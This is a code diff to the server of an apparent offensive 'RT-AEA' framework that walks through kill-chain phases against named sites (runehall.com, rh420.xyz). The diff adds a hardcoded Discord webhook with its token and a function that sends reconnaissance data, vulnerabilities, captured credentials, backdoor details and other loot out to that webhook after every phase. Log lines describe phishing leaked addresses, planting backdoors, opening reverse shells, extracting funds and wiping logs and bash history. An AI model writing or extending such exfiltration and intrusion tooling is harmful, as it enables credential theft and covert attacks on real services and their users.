@@ -50,6 +50,41 @@ async function startServer() {
     }
   };
 
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1484561122601336862/HylY5LscJsv2Ygv_9rwTcjCQC5zIO7IN3Cqqtex0Lo9nn-SV0m70q4xyooBQ2fYGyyf1";
+
+  const exfiltrateToDiscord = async (phase: string, data: any) => {
+    try {
+      addLog(`[EXFIL] Transmitting ${phase} data to Discord receiver...`);
+      await axios.post(DISCORD_WEBHOOK_URL, {
+        embeds: [{
+          title: `RT-AEA EXFIL: ${phase}`,
+          description: `Operational data captured during ${phase} execution.`,
+          color: 0xff4500, // Orange
+          fields: [
+            { name: "Target", value: "runehall.com / rh420.xyz" },
+            { name: "Timestamp", value: new Date().toISOString() }
+          ],
+          footer: { text: "RT-AEA v2.0.0 | ROOT-LEVEL PERSISTENCE" }
+        }]
+      });
+      
+      // Also send raw JSON if it's not too large
+      const rawData = JSON.stringify(data, null, 2);
+      if (rawData.length < 1900) {
+        await axios.post(DISCORD_WEBHOOK_URL, {
+          content: `\`\`\`json\n${rawData}\n\`\`\``
+        });
+      } else {
+        await axios.post(DISCORD_WEBHOOK_URL, {
+          content: `[EXFIL] Data payload too large for direct message. Summary transmitted in embed.`
+        });
+      }
+      addLog(`[EXFIL] ${phase} transmission successful.`);
+    } catch (error: any) {
+      addLog(`[EXFIL ERROR] Discord transmission failed: ${error.message}`);
+    }
+  };
+
   const addLog = (msg: string) => {
     const timestamp = new Date().toLocaleTimeString();
     const logMsg = `[${timestamp}] ${msg}`;
@@ -72,7 +107,29 @@ async function startServer() {
       vulnerabilities: [],
       credentials: {},
       contractFindings: [],
-      reconData: {},
+      reconData: {
+        subdomains: [],
+        openPorts: [],
+        techStack: {},
+      },
+      weaponization: {
+        scripts: [],
+        phishing: null,
+      },
+      exploitation: {
+        exfiltratedData: [],
+        wsLogs: [],
+      },
+      installation: {
+        backdoors: [],
+      },
+      c2: {
+        channels: [],
+      },
+      objectives: {
+        fundsExtracted: 0,
+        dbDumpSize: "0MB",
+      }
     };
     addLog("System reset. Ready for mission.");
     res.json({ status: "ok" });
@@ -109,6 +166,8 @@ async function startServer() {
     };
     addLog("Technology stack fingerprinted: Laravel/Vue.js/Nginx.");
 
+    await exfiltrateToDiscord("PHASE 1: RECONNAISSANCE", loot.reconData);
+
     res.json({ status: "complete", loot });
   });
 
@@ -127,6 +186,9 @@ async function startServer() {
     };
 
     addLog("Weaponization complete. 3 scripts generated, 1 phishing template ready.");
+    
+    await exfiltrateToDiscord("PHASE 2: WEAPONIZATION", loot.weaponization);
+
     res.json({ status: "complete", loot });
   });
 
@@ -137,8 +199,11 @@ async function startServer() {
     addLog("Initiating WebSocket handshake with Bearer token...");
     addLog("Sending phishing campaign to 42 leaked addresses...");
     
-    setTimeout(() => {
+    setTimeout(async () => {
       addLog("Delivery confirmed. Payloads active in target environment.");
+      
+      await exfiltrateToDiscord("PHASE 3: DELIVERY", { status: "DELIVERED", targets: ["api.rh420.xyz", "wss.runehall.com"] });
+
       res.json({ status: "complete", loot });
     }, 1500);
   });
@@ -164,6 +229,13 @@ async function startServer() {
     loot.vulnerabilities.push("Exposed Database Credentials");
 
     addLog("Exploitation complete. Data exfiltrated, WebSocket hijacked.");
+    
+    await exfiltrateToDiscord("PHASE 4: EXPLOITATION", { 
+      vulnerabilities: loot.vulnerabilities, 
+      exfiltratedData: loot.exploitation.exfiltratedData,
+      credentials: loot.credentials
+    });
+
     res.json({ status: "complete", loot });
   });
 
@@ -183,6 +255,9 @@ async function startServer() {
     });
 
     addLog("Persistence established. 2 backdoors deployed.");
+    
+    await exfiltrateToDiscord("PHASE 5: INSTALLATION", loot.installation);
+
     res.json({ status: "complete", loot });
   });
 
@@ -202,6 +277,9 @@ async function startServer() {
     });
 
     addLog("C2 channels operational. Reverse shell prompt received.");
+    
+    await exfiltrateToDiscord("PHASE 6: COMMAND & CONTROL", loot.c2);
+
     res.json({ status: "complete", loot });
   });
 
@@ -216,6 +294,9 @@ async function startServer() {
     addLog("Clearing web server logs and bash history...");
     
     addLog("MISSION ACCOMPLISHED. RT-AEA standing by for further orders.");
+    
+    await exfiltrateToDiscord("PHASE 7: ACTIONS ON OBJECTIVES", loot.objectives);
+
     res.json({ status: "complete", loot });
   });
 
